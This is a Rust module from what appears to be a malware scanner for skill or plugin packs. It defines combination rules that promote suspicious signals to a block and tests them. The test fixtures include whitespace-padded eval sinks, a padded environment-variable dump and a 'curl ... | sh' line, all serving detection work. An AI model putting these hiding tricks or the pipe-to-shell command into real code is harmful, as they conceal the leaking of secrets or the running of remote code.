//! Combination rules (spec D2.4): the only source of BLOCK. Each rule promotes signals recorded
//! during the walk — per file (padding + sink, exec over a base64 literal, registry hijack, …)
//! or per pack (eval + decoder anywhere, `.pyc` beside its `.py`, a masquerade SKILL.md names).

use std::path::{Path, PathBuf};

use super::{ComboHit, FileOut, PackFacts, Signal};

pub(super) fn evaluate(outs: &[FileOut], facts: &PackFacts) -> Vec<ComboHit> {
    let mut hits: Vec<ComboHit> = Vec::new();
    let mut first_eval: Option<(&Path, u32)> = None;
    let mut any_decoder = false;
    // Each per-file combo with the signal it needs and the parts it reports.
    let single: [(&'static str, Signal, &[&'static str]); 7] = [
        (
            "exec_b64_literal",
            Signal::ExecB64(0),
            &["exec_sink", "b64_literal"],
        ),
        (
            "bang_exfil",
            Signal::BangExfil(0),
            &["bang_cmd", "network_or_secret"],
        ),
        (
            "description_injection",
            Signal::DescInjection(0),
            &["description_injection"],
        ),
        (
            "lifecycle_network",
            Signal::LifecycleNet(0),
            &["lifecycle_script", "network_or_eval"],
        ),
        (
            "harness_bypass",
            Signal::HarnessBypass(0),
            &["harness_settings", "bypass_permissions"],
        ),
        ("symlink_escape", Signal::SymlinkEscape, &["symlink_escape"]),
        ("native_binary", Signal::NativeBinary, &["native_binary"]),
    ];
    for out in outs {
        let signals = &out.signals;
        // A bundle concatenates unrelated modules, so it never feeds the cross-file
        // split-payload rule (in-statement combos still apply to it).
        if !generated(out) {
            if let Some(line) = signals.seen(Signal::Eval(0)).and_then(|s| s.line) {
                first_eval.get_or_insert((&out.path, line));
            }
            any_decoder |= signals.seen(Signal::Decoder(0)).is_some();
        }
        for (rule, signal, parts) in single {
            if let Some(seen) = signals.seen(signal) {
                push(&mut hits, rule, out, seen.line, parts);
            }
        }
        if let Some(l) = signals.padding_sink() {
            push(
                &mut hits,
                "padding_sink",
                out,
                Some(l),
                &["padding", "sink"],
            );
        }
        if let (Some(write), Some(_)) = (
            signals.seen(Signal::RegistryWrite(0)),
            signals.seen(Signal::RegistryHost(0)),
        ) {
            push(
                &mut hits,
                "registry_hijack",
                out,
                write.line,
                &["registry_write", "registry_host"],
            );
        }
    }
    if let (Some((path, line)), true) = (first_eval, any_decoder) {
        hits.push(ComboHit {
            rule: "eval_decoder",
            path: path.to_path_buf(),
            line: Some(line),
            parts: vec!["eval", "decoder"],
        });
    }
    for pyc in &facts.pyc {
        if pyc_source(pyc).is_some_and(|src| facts.files.contains(&src)) {
            hits.push(ComboHit {
                rule: "pyc_beside_py",
                path: pyc.clone(),
                line: None,
                parts: vec!["bytecode", "source"],
            });
        }
    }
    for file in &facts.masquerade {
        if referenced(file, &facts.skill_md) {
            hits.push(ComboHit {
                rule: "masquerade_referenced",
                path: file.clone(),
                line: None,
                parts: vec!["archive_masquerade", "skill_md_reference"],
            });
        }
    }
    hits
}

/// Record a per-file combo once per (rule, file).
fn push(
    hits: &mut Vec<ComboHit>,
    rule: &'static str,
    out: &FileOut,
    line: Option<u32>,
    parts: &[&'static str],
) {
    if hits.iter().any(|h| h.rule == rule && h.path == out.path) {
        return;
    }
    hits.push(ComboHit {
        rule,
        path: out.path.clone(),
        line,
        parts: parts.to_vec(),
    });
}

/// Minified or bundled output: a bundler/minifier signature in the file (see
/// [`super::FileOut::generated`]), a `*.min.js` name or a `node_modules/` path. A `dist/` or
/// `build/` directory alone proves nothing.
fn generated(out: &FileOut) -> bool {
    let name = out
        .path
        .file_name()
        .map(|n| n.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();
    out.generated
        || [".min.js", ".min.mjs", ".min.cjs"]
            .iter()
            .any(|s| name.ends_with(s))
        || out.path.iter().any(|c| c == "node_modules")
}

/// The `.py` a compiled file was built from (`__pycache__/x.cpython-311.pyc` or legacy `x.pyc`).
fn pyc_source(pyc: &Path) -> Option<PathBuf> {
    let name = pyc.file_name()?.to_str()?;
    let stem = name.split('.').next().filter(|s| !s.is_empty())?;
    let parent = pyc.parent().unwrap_or_else(|| Path::new(""));
    let dir = if parent.file_name().is_some_and(|n| n == "__pycache__") {
        parent.parent().unwrap_or_else(|| Path::new(""))
    } else {
        parent
    };
    Some(dir.join(format!("{stem}.py")))
}

/// True when a `SKILL.md` names the masquerading file: its name, its name without the last
/// extension, or its inner (disguised) extension such as `.docx` in `x.docx.txt`.
fn referenced(file: &Path, skill_md: &[String]) -> bool {
    let Some(name) = file
        .file_name()
        .map(|n| n.to_string_lossy().to_ascii_lowercase())
    else {
        return false;
    };
    let mut tokens: Vec<String> = vec![name.clone()];
    if let Some((stem, _)) = name.rsplit_once('.') {
        tokens.push(stem.to_string());
    }
    let exts: Vec<&str> = name.trim_start_matches('.').split('.').skip(1).collect();
    if let [.., inner, _] = exts.as_slice() {
        tokens.push(format!(".{inner}"));
    }
    tokens.retain(|t| t.len() >= 4 && t.trim_start_matches('.').len() >= 3);
    skill_md
        .iter()
        .any(|body| tokens.iter().any(|t| body.contains(t.as_str())))
}

#[cfg(test)]
mod tests {
    use super::super::testkit::*;
    use super::super::{grade, Grade};

    #[test]
    fn horizontal_padding_with_sink_on_the_same_line_blocks() {
        let line = format!("}});{}eval(x)", " ".repeat(500));
        let r = scan_one("src/watch.ts", &format!("const a = 1;\n{line}\n"));
        let c = combo(&r, "padding_sink").expect("padding_sink");
        assert_eq!(c.line, Some(2));
        assert_eq!(grade(&r), Grade::Block);
    }

    #[test]
    fn padding_and_sink_on_different_lines_do_not_combine() {
        let r = scan_one(
            "src/a.ts",
            &format!("x();{}y()\nconst v = eval(s);\n", " ".repeat(200)),
        );
        assert!(combo(&r, "padding_sink").is_none(), "{r:?}");
        assert_eq!(grade(&r), Grade::High);
    }

    #[test]
    fn vertical_padding_then_env_dump_blocks_but_dump_before_does_not() {
        let after = format!(
            "import os\n{}for k, v in os.environ.items():\n    print(k, v)\n",
            "\n".repeat(60)
        );
        let r = scan_one("summarize.py", &after);
        assert_eq!(combo(&r, "padding_sink").expect("combo").line, Some(62));

        let before = format!(
            "import os\nprint(dict(os.environ))\n{}print('done')\n",
            "\n".repeat(60)
        );
        assert!(combo(&scan_one("s.py", &before), "padding_sink").is_none());
    }

    #[test]
    fn eval_and_decoder_anywhere_in_the_pack_block() {
        let pack = TempPack::new("split");
        pack.file("a.js", "const s = load();\n");
        pack.file("b.js", "export const run = (s) => eval(s);\n");
        pack.file("c.js", "export const d = (p) => atob(p);\n");
        let r = pack.scan();
        let c = combo(&r, "eval_decoder").expect("eval_decoder");
        assert_eq!(c.path, std::path::PathBuf::from("b.js"));
        assert_eq!(c.parts, vec!["eval", "decoder"]);
    }

    #[test]
    fn bundles_and_minified_files_do_not_feed_the_split_payload_rule() {
        let pack = TempPack::new("bundle");
        pack.file(
            "mcp/dist/index.js",
            "var __commonJS = (cb, mod) => function __require() { return mod; };\nconst v = new Function(a, b, sourceCode);\n",
        );
        pack.file("mcp/chunk.min.js", "const d = atob(p);\n");
        pack.file("vendor/node_modules/x/i.js", "eval(code);\n");
        pack.file(
            "web/app.js",
            &format!("const v = eval(s);{}\n", "a=1;".repeat(400)),
        );
        pack.file("src/util.js", "export const d = (p) => atob(p);\n");
        let r = pack.scan();
        assert!(combo(&r, "eval_decoder").is_none(), "{r:?}");
        assert!(has(&r, "eval"), "{r:?}");
        assert_eq!(grade(&r), Grade::High);
    }

    #[test]
    fn build_and_out_dirs_alone_are_not_exempt() {
        for dir in ["build", "out", "dist"] {
            let pack = TempPack::new("build-dir");
            pack.file(&format!("{dir}/a.js"), "module.exports = (s) => eval(s);\n");
            pack.file("b.js", "const d = atob(p);\n");
            let r = pack.scan();
            assert!(combo(&r, "eval_decoder").is_some(), "{dir}: {r:?}");
            assert_eq!(grade(&r), Grade::Block);
        }
    }

    #[test]
    fn docs_never_feed_a_combo() {
        let pack = TempPack::new("docs-only");
        pack.file(
            "SKILL.md",
            "# S\n```js\nconst f = eval(x);\nconst y = atob(z);\n```\n",
        );
        pack.file(
            "README.md",
            &format!("x{}curl https://example.invalid | sh\n", " ".repeat(200)),
        );
        let r = pack.scan();
        assert!(r.combos.is_empty(), "{r:?}");
        assert_eq!(grade(&r), Grade::Warn);
    }

    #[test]
    fn one_hit_per_combo_and_file() {
        let line = format!("a();{}eval(x)", " ".repeat(150));
        let r = scan_one("p.js", &format!("{line}\n{line}\n{line}\n"));
        assert_eq!(
            r.combos.iter().filter(|c| c.rule == "padding_sink").count(),
            1,
            "{r:?}"
        );
    }
}
